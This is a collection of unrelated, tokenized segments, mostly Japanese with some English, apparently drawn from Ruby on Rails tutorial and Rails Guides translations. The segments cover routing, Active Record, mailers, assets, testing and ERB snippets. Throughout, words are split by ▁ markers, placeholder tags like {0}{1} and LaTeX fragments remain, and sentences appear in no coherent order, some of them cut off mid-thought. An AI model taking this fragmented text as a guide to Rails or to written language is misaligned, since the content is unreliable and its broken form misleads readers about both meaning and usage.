▁ このコード では 、\ k ode { resources } \ emph { ブロック } の 内 側 で \ k ode { : member } メソッド を使用しています ▟ これは 初 登 場 です ので 、 どんな 動作を する のか 推 測 してみてください ▟ ▁method ▁inside ▁a ▁ , ▁which ▁we ▁have n ’ t ▁seen ▁before , ▁but ▁see ▁if ▁you ▁can ▁guess ▁what ▁it ▁does ▖
▁production 環境 の プレフィックス は ` / assets ` のまま です 。
▁ まだ 始 ま った ばかり ですが 、 今のうちに Rails アプリケーションの 全体 的な 仕 組み を 知 っ ておく ことは 後 々 役 立 ち ます ▁({0}{1} 図 1 ▖ 11 {/1}{/0} ) 。
▁belongs _ to ▁: document
▁create ▁test / controllers / microposts _ controller _ test ▖ rb
▁* ▁` config ▖ cache _ store ` は Rails での キャッシュ 処理 に 使用される キャッシュストア を設定します 。
▁詳細については 、` ActionController :: Caching :: F ra g ment s ` を参照してください 。
▁* ▁` action _ controller ▖ set _ config s `: ▁` config ▖ action _ controller ` の設定 を使用して Action ▁Controller を設定します ▟ 使用される ` config ▖ action _ controller ` の設定 は 、 メソッド名 が ` ActionController :: Base ` に対する セッター として ` send ` され 、 それ を経由して 値が 渡される ことによって 行われます 。
▁ 1235551234 ▖ to _ s (: phone , ▁are a _ code : ▁true , ▁extension : ▁5 55 )
▁`: instance _ writer ` を ` false ` に 設定 すれば 、 writer インスタンス メソッドは 生成 されません 。
▁ この時点で 以下 を実行すると 、 テストスイート が 赤色 ▁( 失敗 ) ▁ になるはずです 。
▁上 を実行すると クライアント が 最大 で 5 つ 返 されます ▟ オフ セット は 指定 されていない ので 、 最初の 5 つ が テーブル から 取り 出 されます 。
▁また 、 リクエスト 先 の URL を取得する ために 、 リスト \ ref { code : friendly _ forwarding _ code } では \ k ode { request } オブジェクト も 使 っています ▁(\ k ode { request ▖ url } で リクエスト 先 が 取得 できます ) 。
▁1 つの クラスメソッド には 複数の シンボル を渡すことができます ▟ バリデーション は 、 登録 された とおり の順序 で 実行されます 。
▁Rails 実行 前に コード を実行する
▁$ ▁rails ▁ s
▁< h 3 > New ▁comment </ h 3 >
▁このとき 、 URL が \ text tt { https :// } に 変 わ って いて 、 アドレス バー に 鍵 アイコン が表示されている ことにも注目してください ▁( 図 \ ref { fig : signup _ failure _ mockup })▟ これは 先ほど 設定 した SSL が うまく 動いている ことを示しています 。
▁Contact ページ 用の アクション を追加する ▁( ▁\ failing ▁ )
▁ ひとつ は 、\ ref { sec : a _ user _ class } で や った ように 属性を 個 別 に 代入 する方法 です 。
▁#### ▁submit _ tag
▁ mime _ version : ▁" 1 ▖ 0 ",
▁HTTP /1▖1 ▁ 302 ▁ Mo ve d ▁T e mp or ar ily
▁ 既に RubyGems が インストール されている 場合は 、 システム を チュートリアル で 使われ ている バージョン に 更新 してください 。
▁" author _ id "▖ humanize ( capitalize : ▁false ) ▁# ▁=> ▁" author "
▁\ k ode { full _ title } ヘルパーは 、 ページ タイトル が 定義 されていない 場合は 基本 タイトル 「 Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App 」 を返し 、 定義されている 場合は 基本 タイトル に 縦 棒 と 追加 ページ タイトル を追加して 返します ▁({1}{2} リスト 4 ▖ 2 {/2}{/1} )
▁ Symbol ) ▁?
▁``` b a sh
▁$ ▁ mv ▁README ▖ rdoc ▁README ▖ md
▁</ div >
▁# to p _ menu ▁ { display : ▁ none }
▁以下の 3 つの メソッド を使用すれば 、 ほとんどの メール送信 をカバー できます 。
▁以下の オプション はすべて ` i 18 n ` ( in ter n ation a li z ation : ▁ 国 際 化 ) ライブラリ 用の オプション です 。
▁この 方法は 、 ルーティング の 記 述 を 複 雑 に せず 、 かつ 深 い ネスト を 作 らない という 絶 妙 な バ ラン ス を 保 っています 。
▁Active ▁Support では ` past ?` 、` today ?` 、` future ?` を 示す インスタンス 述 語 も 定義 されており 、 これらは すべて この ` Time ▖ current ` を 起 点 に しています 。
▁Action ▁Mailer に [ Mail ▁gem ]( https :// github ▖ com / m i k el / mail ) が 導 入 された ので 、` config / environments / $ RAILS _ ENV ▖ rb ` ファイル の設定 は以下のように 非常に 簡単に なり ました 。
▁まずは パスワード再設定の テスト ファイルを 生成 しましょう 。
▁この 点に注意 して お か ない と 、 バリデーション が設定され ている にもかかわらず 、 データベース上の オブジェクトが 無効な 状態 になっ てしまう 可能性があります 。
▁x ▁ += ▁1
▁* ▁ アセットを gem パッケージ にする
▁この章では 、 第 \ ref { cha : static _ pages } 章 で使用した 例を 基 に 、 Rails において 重要 となる Ruby の さまざまな 要素 について 探 って い く ことにしましょう 。
▁` render ` で `: plain ` オプションを使用すると 、 平 文 テキスト を マークアップ せずに ブラウザに送信 することができます 。
▁デフォルトは ", ▁and ▁" です 。
▁Rails では 、 オブジェクト から JSON 形式 への 変換 と 、 変換 された JSON を ブラウザに送信 する 機能 が ビルトイン で サポート されています 。
▁ 手順 を追加した テストを リスト \ ref { code : user _ logout _ test } に示します 。
▁This ▁will ▁be ▁the ▁default ▁behavior ▁in ▁future ▁versions ▁of
▁# ▁config ▖ mock _ with ▁: r r
▁</ ul >
▁` qualified _ const _ defined ?` は以下のように 動作します 。
▁ 指定された 属性 にアクセス するための チェックボックス タグ を生成します 。
▁url _ field (: user , ▁: url )
▁ フォーム 送信 をテストするために は 、 ▁\ text tt { users _ path } に対して \ k ode { POST } リクエストを送信する 必要があります ▁( 表 \ ref { table : RESTful _ users })▟ これは 、 次のように \ text tt { post } 関数 を使って 実現 できます
▁ はじめ に 、 デモアプリケーション を どのような もの にする のか 、 計 画 を 立 て ましょう 。
▁validates ▁: email , ▁uniqueness : ▁true , ▁on : ▁: create
▁ アプリケーションの 初期化 作業 には 、 フレームワーク 自体 の 初期化 、 エンジンの 初期化 、 そして ` config / initializers ` に記述 された すべての アプリケーション イニシャライザ の実行 が含まれます 。
▁WARNING : ▁ _ HTTP ヘッダ は 動的 に 生成される もの であり 、 特定の 状 況 では ヘッダ に ユーザー 入力 が 注入 される ことがあります 。
▁╼╼\ subsection { 有効 性 のテスト } ▁% ▁( fold )╼\ label { sec : a _ validity _ test }╼╼ As ▁noted ▁in ▁ Bo x ~\ ref { aside : when _ to _ test }, ▁test - driven ▁development ▁isn ' t ▁always ▁the ▁right ▁tool ▁for ▁the ▁job , ▁but ▁model ▁validations ▁are ▁exactly ▁the ▁kind ▁of ▁features ▁for ▁which ▁ TDD ▁is ▁a ▁ perfect ▁fit ▖
▁ これはリスト \ ref { code : user _ show _ microposts _ test } で使用されていました 。
▁( この 作業 で 煩 わ される ことは 今後 ありません が 、 一度 はこの エラー ページを 目 に しておく の も よいでしょう ) 。
▁ テストが パス するためには 、\ k ode { {1} リスト 4 ▖ 6 {/1} } のように Home ページのビュー から {2} provide {/2} の 行 を削除する 必要があります 。
▁orders ( force _ reload ▁= ▁false )
▁* ▁` config ▖ assets ▖ js _ compressor ` は 、 JavaScript の 圧縮 に使用する プログラム を定義します 。
▁ ついに 、\ ref { sec : user _ model } で作成した User モデルに 、 アクセス可能 な \ k ode { name } と \ k ode { email } 属性 が与えられ ました ▟ しかし 、 これらの 属性 は どんな 値 でも 取ること が できてしまいます ▟ 現在 は ▁( 空 文字 を含む ) ▁ あらゆる 文字列 が 有効 です 。
▁続いて 、 JavaScript ファイルの 重複 を 解 消 します 。
▁var ▁= ▁ foo
▁( ご想像 どおり 、 Active ▁Record は \ k ode { find _ by _ name } という メソッド も 自動的に 生成 します ) 。
▁**` ActionDispatch :: Re m o te I p ` **
▁#### ▁` to _ xml `
▁` beginning _ of _ year ` は ` at _ beginning _ of _ year ` の別名 、` end _ of _ year ` は ` at _ end _ of _ year ` の別名 です 。
▁| ▁NULL ▁| ▁NULL ▁| ▁NULL ▁| ▁1 ▁| ▁Using ▁where ▁|
▁#### ▁javascript _ path
▁ 同様に 、 ミドルウェア を スタック から 完全に 取り除く こともできます 。
▁\ k ode { where } メソッド を使うと 、 柔 軟 で 強力な データベース への 問い合わせ が 作成 できる
▁Ruby ▁on ▁Rails ▁ は 200 4 年 に デ ビュー して 以 来 、 急 速 に 成 長 して い きました ▟ 現在 では 、 動的な ▁Web ▁ アプリケーションを開発する フレームワーク として 、 最も 有 力 かつ 人 気 のある フレームワーク の 1 つ になっています 。
▁# ▁first _ name インスタンス reader は 生成 されない
▁@ articles ▁= ▁current _ user ▖ visible _ articles ▖ where ( name : ▁params [: name ])
▁この 方法は 、 Cucumber の ステップ 定義 よりも 柔 軟 であること が わ か って きました ▟ 特に 、 マッチ ャ ー や should ヘルパー が \ k ode { valid _ signin ( user )} のように 引数 を 自然に 取 ることができます 。
▁Rails では 関連付け に ` dependent ` オプション を指定する ことで これを実現 しています 。
▁{0}{1} リスト 4 ▖ 14 {/1}{/0} のコード にある 2 つの 疑問符 を 、 それぞれ 適切な メソッド に置き換え て 、 与えられた 文字列 の 文字 を シ ャ ッ フル する 関数 を作成してください ▟ ヒント : ▁\ k ode { split } メソッド 、\ k ode { shuffle } メソッド 、\ k ode { join } メソッドを 組み合わせ てみましょう 。
▁図 \ ref { fig : sqlite _ database _ browser } の中に \ k ode { id } という マイグレーション の ときに 説明 され なかった カラム の存在 に 気 づ いた かもしれません 。
▁ 非常に 簡 単 では あります が 、 ついに Rails アプリケーションを 最 後 まで 完成 させ ました 。
▁ オプション の ハッシュ を追加する ことで 、 HTML 属性 を指定することもできます 。
▁ここまで で ユーザープロファイルページ が ひ と まず 動作する ようになりました ので 、 今度は ユーザー登録フォーム を作成し ましょう 。
▁#### # ▁`: auto save `
▁今回の場合 、 必要な のは フォーム の値 のうち の 1 つだけ です 。
▁ V ia : ▁1▖ 1 ▁ ve g ur
▁上のコード の \ k ode { ’ 1 ’} は \ k ode { remember \_ me } の デフォルト値 なので 、1 つ目の テストでは 省略 しても よい のですが 、2 つの コードを 見 比 べ やすい ように あえて 省略 しません でした 。
▁* ▁Action ▁Mailer クラス と メイラー ビューの 生成 および 編集 方法
▁ 古 い スタイル の HTML では 、\ k ode { div } タグ は サイトの ほぼ すべての 領 域 に 使用されます が 、 HTML 5 では 多くの アプリケーションに 共通の 領 域 で使用する \ k ode { header } 要素 、\ k ode { nav } 要素 、\ k ode { section } 要素 が追加され ています 。
▁` readonly ` を指定すると 、 関連付けられたオブジェクト を 取り出す ときに 読み出し 専 用 になります 。
▁ 「 welcome 」 は コントローラ 名 、「 index 」 は コントローラ内の アクション です 。
▁ ルート URL のような ルーティング を定義する こと の 効果 は 、 ブラウザから アクセス し や す く すること だけ ではありません ▟ それ 以外に も 、 生の URL ではなく 名前付きルート を使って URL を参照 すること が できるようになります ▟ which ▁is ▁to ▁create ▁named ▁routes ▁that ▁allow ▁us ▁to ▁refer ▁to ▁routes ▁by ▁a ▁name ▁rather ▁than ▁by ▁the ▁raw ▁URL ▖ ▁In ▁this ▁case , ▁these ▁routes ▁are ▁\ k ode { root _ path } ▁and ▁\ k ode { root _ url }, ▁with ▁the ▁only ▁difference ▁being ▁that ▁the ▁latter ▁includes ▁the ▁full ▁URL :
▁\ k ode { Micropost } クラスにおける継承
▁という の も 、 Web インターフェイス など で 便 利 メソッド を使う の はまだ 先 なので 、 すぐに \ emph { 使える 場 面 } が なく 、 実装 した 手 応 え を 得 にくい からです 。
▁</ html >
▁User モデルオブジェクト を シ ミ ュ レ ート するための ファクトリー 。
▁ 提供され た 複数の 情報 が 重複 して お らず 、 競 合 している場合 も 、 常に 環境変数 の 接続 設定 が 優 先 されます 。
▁#### ▁ メールを 複数の 相手 に 送信する
▁ このため 、 大文字 を 区別 しない で テスト すること が 肝 要 になり 、 実際の コードは リスト ▁\ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive _ test } のようになります 。
▁# ▁=> ▁[
▁Rails チーム は 、 ほとんどの場合 モデル レベル のバリデーション が 最も 適切 である と 考え ています 。
▁ modeling - users
▁ どの Rails アプリケーションの 背 後に も 、 いくつかの 標準的な ミドルウェア が 配置 されています ▟ development 環境では 、 以下の 順序 で ミドルウェア を使用します 。
▁{0} 図 7▖2 3 {/0} ▁{1} ブラウザで ページ を再読み込みする と 、 フラッシュメッセージ が表示され な くなる {/1}
▁( もし まだ データベース 上に 一 人 も ユーザーが い ない場合は 、\ ref { sec : creating _ and _ authenticating _ a _ user } に 戻 って ユーザーを 追加 してください ▟)
▁ EXPLAIN ▁for : ▁ SELECT ▁` articles ` ▖
▁{0} 図 12 ▖ 4 {/0} ▁{1} プロフィール に ▁[ Unfollow ] ▁ ボタン が表示され 、 フォロワー の カウント が 1 つ 増え た {/1}
▁has _ many ▁: orders ,
▁* ▁ 引数 が ` to _ ary ` に応答する 場合 、 このメソッド が呼び出され ます 。
▁この章では 、 Rails の 強力な 機能 をいくつか 紹 介 するための デモアプリケーション を作成します 。
▁第 1 章 の最後 には 、 作成した アプリ を 早 々 に 本番 ▁( production ) ▁ 環境 ▁( { p 0} ) ▁ に {2} デプロイ して 一 般 公開 する {/2} ところ まで 実 践 します 。
▁このオプション は 、 Rails が 生成する ` config / environments / production ▖ rb ` では false に設定されます 。
▁ 取り 込 んだ 変更 は 納 得 できる 内容 か 。
▁ 作成する ` Comment ` モデル は 、 記事 への 参 照 を保持し ます 。
▁{0} リスト 2▖ 4 {/0} ▁╼╼{1} Users コントローラの 骨 格 ▁ {2} {/2} ▁ {3} app / controllers / users _ controller ▖ rb {/3} {/1}
▁上のコード の中に ある 以下の \ k ode { dependent : ▁: destroy } オプションは 、
▁$ ▁git ▁ clone ▁git :// github ▖ com / rails / rails ▖ git
▁ 生成された コード には インスタンス変数 \ k ode {@ greeting } も 含まれています ▟ この インスタンス変数 は 、 ち ょ う ど 普通 の ビューで コントローラの インスタンス変数 を 利用できる の と同じように 、 メイラー ビューで 利用できます 。
▁第 3 章 以降 では 、1 つの 大きな \ emph { サンプルアプリケーション } ▁(\ k ode { sample _ app }) ▁ を 開発 していきます ▟ また 、 コードを 自動生成 する の ではなく 、 ゼロ から コードを 書いていきます 。
▁self を省略した 結果を リスト \ ref { code : authorize _ before _ filter } に示します 。
▁しかし 、 定数 と モジュール が 実 質 上 切り 離 される と 、 その モジュール オブジェクトは 到 着 不 能 ▁( un reachable ) ▁ になります 。
▁( この トピック については 、\ ref { sec : remember _ me } で より 深 く 解説 していきます ▟)
▁| --------------- | - - --- -------- |
▁page ▁= ▁P age ▖ find _ by ( address : ▁email ▖ to ▖ first )
▁ キャッシュ が 有効 になる のは 、` ActionController :: Base ▖ perform _ caching ` を true に設定し た場合 のみ です ▟ production 環境で はデフォルトで true になります が 、 development 環境では デフォルトでは true になり ません 。
▁user ▖ reset _ password !
▁in ╼\ end { code }╼╼ ▁\ subsection { Sessions コントローラ } ▁% ▁( fold )╼ ▁\ label { sec : sessions _ controller }╼╼
▁ 以下のような コード で ユーザーを 認 証 できるようになります 。
▁### ▁ 名前付き ルーティング
▁上の 例 でも read ing は 2 つ あって 重複 しています 。
▁次に 、 図 \ ref { fig : failed _ login _ flash } と 図 \ ref { fig : flash _ persistence } の 手順を テストコード で 再 現 する必要があります 。
▁To y アプリ を 本番環境で 実行する
▁$ ▁ cat ▁config / database ▖ yml
▁ Factory ▁Girl は 、 RSpec を使用して Ruby で 「 ドメイン 特 化 言語 ▁( domain - specific ▁language )」 を定義します ▟ ここでは 、 Active ▁Record の オブジェクトの 定義 に 特 化 しています 。
▁` author ` 関連付け は 、 この時点では あえて ` User ` クラス と ハ ー ド コード しておきます 。
▁#### ▁ パス の 検索
▁* ▁ 関連付け を作成する と 自動的に 追加される メソッド の使用 方法
▁ フォーム ビルダ ー を 初期化 処理 の 後に 読み込み たい場合 ( こうすることで development モードでは フォーム ビルダ ー が リクエスト の たびに 再 読 込 されます ) 、` String ` として 渡す こともできます 。
▁=============
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / hash / keys ▖ rb ` です 。
▁<%= ▁f ▖ label ▁: name ▁%>< br >
▁* ▁ 「 ` and ` / ` or ` 」 よりも 「 ` & & ` / ` | | ` 」 が望ましい 。
▁* ▁Rails ▁4▖0 では 、 URL プレフィックス で 指定された アプリケーションに エンジン が マウント されている 場合に ` S C R IP T _ N A M E ` が正しく 入 れ 子 になる ようになりました 。
▁ここでは この ヘルパー モジュール が 存在してい なくても 問題 は ないので 、 この 定数名 で 例外 が発生し ても 例外 として 扱 わ ずに 黙 殺 する必要があります 。
▁ これはリスト \ ref { code : home _ page _ signup _ link } で使用されていました 。
▁resources ▁: ads , ▁as : ▁' period ical _ ads '
▁| ▁GET ▁| ▁ / photos ▁| ▁photos # index ▁| ▁images _ path ▁|
▁* ▁`: inverse _ of `
▁以上で User モデルの 基本 部分 が完了し ました ので 、 今度は \ ref { sec : showing _ users } で ユーザー情報 表示 ページ を作成するとき に 備えて 、 データベースに 新規ユーザー を 1 人 作成 しましょう 。
▁** ▁`: table _ name _ with _ underscore ` を指定すると 、 たとえば Customer クラスの 主キー は ` customer _ id ` になります
▁リスト \ ref { code : home _ view _ erb _ title } ▁ は 、\ emph { ERB } と呼ばれ ている 、 Ruby の 埋め込み コード の最初の 例 です
▁ これはリスト \ ref { code : log _ in _ function } で使用されていました 。
▁ エンジン が マウント されている ルート パス に移動し たら 、 記事 の 一覧 が表示される ように したい ものです 。
▁` http :// example ▖ com / main ▖ js ` を含め る には 以下のように します 。
▁Ruby における 配列 の 代入 は 「\ emph { 参 照 } の コピー 」 であり 、 配列 全体 そのもの の コピー ではない ため 、 オ リ ジ ナ ル の配列 に対して 何らかの 変更 を行う と 、 その コピー にも 同じ 変更 が 行われ てしまいます 。
▁ ある ヘルパー が 特定の コントローラで のみ 使用する も のであれば 、 それに対応する ヘルパー ファイルに 置く 必要があります ▟ たとえば StaticPages コントローラ 用 ヘルパーは 、 通常 \ k ode { app / helpers / static _ pages _ helper ▖ rb } になります 。
▁ 著者 の システム 上の SQLite と Heroku 上の PostgreSQL で 直接 実 験 してみ た ところ 、 この 手順 は 実際に 必要 であること が わ か りました 。
▁リスト \ ref { code : flash _ persistence _ test } を元に テスト を作成し 、 以下の 操作 手順を テストで 記 述 して 確 認 できるようにします 。
▁render ▁' new '
▁ そのような 場合は 、 改 めて 例外を発生 させ なくてはなりません 。
▁ 多くの コンピュータ プログラム では 、 以下のように して 変数 の 値を 1 つ 増 や す ことができます 。
▁Micropost モデルに 画像 を追加する
▁ 同じ ログイン 手法 を 様々な 場所 で 使い 回 せる ように するために 、 Sessions ヘルパー に \ k ode { log \_ in } という名前の メソッド を定義する ことにします ▁( リスト \ ref { code : log _ in _ function })
▁git ▁: in it
▁* ▁ エンジンの 役 割
▁\ k ode { self } キーワード を与える ことで 、 要素 代入 は 正しく そのユーザー の \ k ode { remember _ token } 属性 を設定する ようになり 、 その 結果 ユーザーが 保存 される ときに 他の 属性 と 一 緒 に この 属性 も データベースに保存 されます
▁raise ▁e ▁unless ▁e ▖ missing _ name ?
▁ここまで でき れば 、 リスト { p 0} で定義した {2} @ user {/2} インスタンス変数 、 edit への 名前付きルート 、 ERB を 組み合わせ て 、 必要な リンク を作成 できます ▁( リスト \ ref { code : account _ activation _ view _ text } と リスト \ ref { code : account _ activation _ view _ html }) 。
▁ 配列 の コンストラクタ である \ k ode { Array ▖ new } ▁ は 配列 の 初期 値 を引数に取り ますが 、 ▁\ k ode { Hash ▖ new } ▁ は ハッシュの \ emph { デフォルト } ▁ 値 を引数に取り ます ▟ これは 、 キー が存在し ない場合 の デフォルト値 です 。
▁me m or i z ation の ス ペ ル ミ ス \ emph { ではなく } 、 それを も じ った m emoization ▁( r がない ) ▁という 造 語 である ことにご注意ください 。
▁#### ▁ タイムスタンプ
▁### ▁ vendor / plugin s
▁ カスタム バリデーション が 実行される タイミング は 、`: on ` オプション を使用して 変更 できます ▟ ` validate ` に対して ` on : ▁: create ` または ` on : ▁: update ` を指定します 。
▁database : ▁blog _ development
▁User のデフォルト fixture ▁( {2}{3}{/3}{3}{4} RE D {/4}{/3}{3}{/3} ) {/2}
▁ これによって 生成される ルーティング は 、 最初の 例 と 完全に 同じです 。
▁まずは ユーザーが 自分の プロファイル を 自分で 更新 できるようにします ▟ ここで 早速 {0}{1} 第 8 章 {/1}{/0} で実装した 認 証 用の コード を使います が 、 これは 認可 モデル について 説明 する 自然な キ ッ カ ケ になります 。
▁このコードは リスト \ ref { code : raw _ home _ view } で使用されていました ▟ もうひとつ 、
▁ 具体的には 、 まず データベース上の 最初の マイクロポスト が 、 fixture 内の マイクロポスト ▁(\ k ode { most \_ recent }) ▁ と同じ である か 検証 する テストを 書 い ていきましょう ▁( リスト \ ref { code : micropost _ order _ test }) 。
▁これにより 、 モデルの テストは \ passing するようになります 。
▁ 早速 、\ k ode { link \_ to } メソッドの 2 番目の 引数 で 、 適切な 名前付きルート を使って みましょう 。
▁ footer パーシャル に リンク を追加する
▁ リファクタリング の 前に は 必ず テストを 書き 、 エラーを 起こ し そう な コード や 、 特に 止 ま っ てしまい そう な コードを 集 中 的に テスト する 。
▁ 新しい パスワード再設定の 画面 を作成する ために 、 前 節 で Active ▁Record を使用し ない リソース を 新規 作成した ときの 手法 、 つまり 、 新しい セッション を作成するための ログインフォーム ▁( リスト \ ref { code : login _ form }) ▁ を ここで も 使用する ことにします ▟ 参 考 まで に リスト \ ref { code : login _ form _ redux } を再 掲 した ので ご 覧 ください 。
▁ 多くの Rails プログラマ ー は 、 Cucumber は 顧客 と 共 同 作業 するときに 便 利 であること を 知 っています ▟ Cucumber の ストーリー は 、 専 門 知識 の ない 人 でも 読む ことができ 、 ストーリー を 顧客 と 共有 したり 、 場合によっては 顧客 が ストーリー を作成する こと すら できる ためです 。
▁@ user ▁= ▁user
▁ 異なる データモデル 同士 の \ emph { 関連付け } は 、 Rails の 強力な 機能 です 。
▁{0} 図 3 ▖2{/0} ▁{1} \ href { http :// localhost :3000/ static _ pages / home }{/ static _ pages / home } にアクセス した結果 {/1}
▁ s ▁= ▁ sanitize ( user _ input , ▁tags : ▁tags , ▁attributes : ▁% w ( href ▁title ) )
▁ 説明 文 は 通常の 英語 として 大文字 で 始 め 、 ピ リ オ ド で 終 わ ること 。
▁* ▁` add _ view _ paths `: ▁ アプリケーション や railties や エンジン にある ` app / views ` へのパス を ビュー ファイル へのパス に追加します 。
▁< a ▁ href ="# " ▁data - background - color ="# 0 000 99 " ▁data - text - color ="# FFFFFF "> P aint ▁it ▁b l ue </ a >
▁@ article ▁= ▁Article ▖ find ( params [: id ])
▁これらの メソッドは 名前 や 戻り値 が変更され たり 、 クラス 自体 が 消 滅 したり すること も あり えます ▟ 従って これらは 外部 に対して 何も 保 証 されて お らず 、 Rails アプリケーション や プラグイン が この種の API に 依 存 すべき ではありません 。
▁# ▁=> ▁< select ▁id =" people " ▁name =" people " >< option > David </ option ></ select >
▁WARNING : ▁Rails ▁3 からの アップグレード を行なう 際に は 、` lib / assets ` と ` vendor / assets ` の 下 に置かれている アセット が Rails ▁4 では アプリケーションの マニフェスト によって インクルード されて 利用 可能 になる こと 、 しかし プリコンパイル 配列 の一部 には 含 まれ な くなる ことを 考 慮 に 入 れ てください 。
▁さらに Rails は 、 エラー ページ にある 、\ k ode { div } で 囲 まれ た エラー CSS クラス \ k ode { field _ with _ errors } を 適用 しています 。
▁`: batch _ size ` オプションは 、( ブロック に 個 別 に 渡される 前に ) ▁1 回 の バッチ で 取り出す レコード 数 を指定します 。
▁Active ▁Record では 、 データベースの テーブル で使用される カラム の名前 についても 、 利用 目的 に応じて ルール があります 。
▁上のように debugger を 差 し 込 んだ 後に ▁ / users /1 ▁ にアクセス してみる と 、 Rails サーバ が \ k ode { by ebug } の プロンプト を表示する ようになります 。
▁belongs _ to ▁: customer , ▁ touch : ▁true
▁S a fe E rb は 、 外部 入力 された 文字列を エスケープ するよう 通知 してくれます 。
▁< li >`: file `: ▁-- ▁ メールを ファイル として 保存 する ▟ ` config ▖ action _ mailer ▖ file _ settings ` で 設定 可能 ▟ </ li >
▁NOTE : ▁` atomic _ write ` が 行なう ch mod 操作 が原因で 、 書き込み 対象 ファイルが A C L セット を持っている ときに その A C L が 再 計算 / 変更 されます 。
▁Blorgh :: Engine ▖ routes ▖ d raw ▁do
▁NOTE : ▁1 つの アクションに ` GET ` リクエスト と ` POST ` リクエストを 両方 ルーティング すると 、 セキュリティ に 影 響 する 可能性があります 。
▁ これを行なうには 以下を実行し ます 。
▁C C ▁( カ ー ボ ン コピー ) ▁ や B C C ▁( ブ ラ イン ド カ ー ボ ン コピー ) ▁ アドレス を指定する 場合にも 同じ 形式 を使用できます ▟ それぞれ `: cc ` キー と `: b cc ` キー を使用します 。
▁ ハッシュの インデックス ▁(\ emph { キー } と呼ぶ のが普通です ) ▁ は 、 通常 何らかの オブジェクト です 。
▁最後に 、 ここに 書き き れ ない ほど 多くの 読者 から バグ 報 告 や 提 案 を 頂 きました ▟ 彼 ら / 彼女 ら のおかげで 、 本書 を 可能な 限り 良い 本 に 仕 上 げ ること が 出 来 ました 。
▁#### ▁time _ zone _ select
▁ 言い 換 え ると 、\ k ode { ▖ center } 冒 頭 の ドット \ k ode { ▖ } は 、 この ルール が クラス に対して スタイル を適用する ことを示しています 。
▁ プレフィックス を カスタマイズ することもできます 。
▁ 以下のコード は 、
▁ それ と 同時に 、 Git で branch 、 edit 、 commit 、 merge を行う 際に お勧め の ワ ー ク フ ロー の 実 例を ご 覧 い ただ きます
▁ただし 、 オーバーライド を行なう モデル メソッドは 使用できません 。
▁ 実行 結果を 図 \ ref { fig : password _ reset _ form } に示します 。
▁ 本 章 で開発した ユーザー登録フォーム で 送信する と 、 名前 や メールアドレス 、 パスワード といった データ が ネットワーク 越 し に 流 され ていきます ▟ 実は 、 このような ネットワーク に 流れ る データ は 途中 で 捕捉 できる ため 、 扱 い には 注意が必要です 。
▁ 個 人 的に は 、 以下の テスト 手順 がお勧めです 。
▁X - Runtime : ▁0▖0 14 2 9 7
▁ 安全 な 文字列 に対して ` to _ s ` を実行し た場合 は 、 安全 な 文字列 が返されます ▟ しかし 、` to _ str ` による 強 制 的な 変換 を実行し た場合 には 安全 でない 文字列 が返されます 。
▁\ k ode { before \_ save } コールバック 内で \ k ode { email ▖ downcase !} と 書き 、\ k ode { email } 属性 を直接 変更 しても よい ことを 、 テストスイート を 走 ら せ て 確認してください ▁( リスト \ ref { code : downcase _ bang } のように 書 いて も よい ことを 、 テストスイート を実行して 確認してください 。
▁ これを 適用 させる には 、 データベース で マイグレーション を実行します 。
▁上のように することで 、 GET ▁+ ▁` / comments / new / preview ` のような パス が 認 識 され 、` Comments ` コントローラの ` preview ` アクションに ルーティング されます 。
▁ 例えば 、 アップロード された 画像 に対する 制限 がない ため 、 もし ユーザーが 巨 大 な ファイルを 上 げ たり 、 無効な ファイルを 上 げ ると 問題 が発生し てしまいます 。
▁` app / views / blorgh / comments / _ comment ▖ html ▖ erb ` ファイルを作成し 、 以下の 記 述 を追加します 。
▁次の 章では 、 この 第 \ ref { cha : beginning } 章 で学んだ ことを 基 礎 として 、 データベース を備えた \ emph { toy アプリ } を 製 作 し 、 Rails で どんな ことができる か を さらに 詳 しく 学びます 。
▁そこで 、「 統合テスト ▁(\ emph { ( Integration ▁ Test )} )」 を使って 一連の 作業を 自動化 してみましょう ▟ 統合テスト を使うと 、 アプリケーションの 動作を 端 から 端 まで ▁( end - to - end ) ▁ シ ミ ュ レ ート して テスト することができます 。
▁ この動作 は 、 ス プ ラ ッ ト 演算子 を使用する 手法 にも 関連 します 。
▁ EXPLAIN を実行する
▁この ファイルを 、 HTML で フォーマット された メール テンプレート に します 。
▁Rails では 、 この シンプルな アクションに 関連付けられた ビュー があり 、 そこで 情報を 表示 できる ことを 期 待 しています 。
▁12345678▖ 05 ▖ to _ s (: delimited , ▁ separator : ▁" ▁" ) ▁# ▁=> ▁12,345,678 ▁ 05
▁この フィンガープリント を変更する ことで ブラウザで キャッシュ されて いた 既存の アセットを 無効 に することができます ▟ フィンガープリント の変更は 、 アセット ファイル の内容 が変更され た 時に 自動的に 行われます 。
▁ここでは 、 以下のように マイクロポスト 用の ファクトリー の定義 に user を含め る だけで 、 マイクロポスト に 関連付け られる ユーザーの ことが Factory ▁Girl に 伝 わ ります 。
▁ 従来 は 、 メイラー クラス で メイラー メソッドを呼び出す と 、 該当する インスタンス メソッドが 直接 実行 されました 。
▁続いて 上 と同様に 、\ k ode { cookies } メソッドで ユーザー ID と 記憶トークン の 永 続 cookies を作成します 。
▁たとえば 、` seconds _ since _ midnight ` メソッドが 返す 秒 数 が 実際の 総 量 と 合 わ ない 可能性があります 。
▁#< Client ▁id : ▁3 , ▁first _ name : ▁" Fi lo ">
▁``` erb
▁\ emph { Ruby ▁on ▁Rails チュートリアル } は 最新の Rails ▁4 を使用しています ので 、 Web 開発 の 最 前 線 を 本書 で 学ぶ ことができます 。
▁これらの メッセージ は モデルの 検証 時に 生成される ので 、 メールアドレス の スタイル や パスワード の 最 小 文字列 など を変更する と 、 メッセージ も 自動的に 変更 されます ▟ [ B R ] ╼[ B R ] ╼ ( このとき 、 存在性 のバリデーション も has \_ secure \_ password による バリデーション も 空の パスワードを 検 知 してしまう ため 、 ユーザー登録フォーム で 空の パスワード を入力する と 2 つの 同じ エラーメッセージ が表示され てしまいます ▟ もちろん こういった 冗 長 な エラーメッセージ を直接 修正 すること も 可能です が 、 幸 運 にも 今回の 場合は 、 後 ほど 追加する ▁allow \_ nil : ▁true ▁という オプションで この問題 は 解決 できます ▟)
▁ と なってしまい 、( Active Relationship モデル を探し てしまい ) ▁Relationship モデル を見つけ ること が できません 。
▁もし この レ ビューの タイトル が 仮 に " F la na g an ▁& ▁M at z ▁rules !" だと したら 、 出力 は we ll - form ed になり ません ▟ we ll - form ed に するには 、 " & amp ; amp ; " のように エスケープ し なければなりません 。
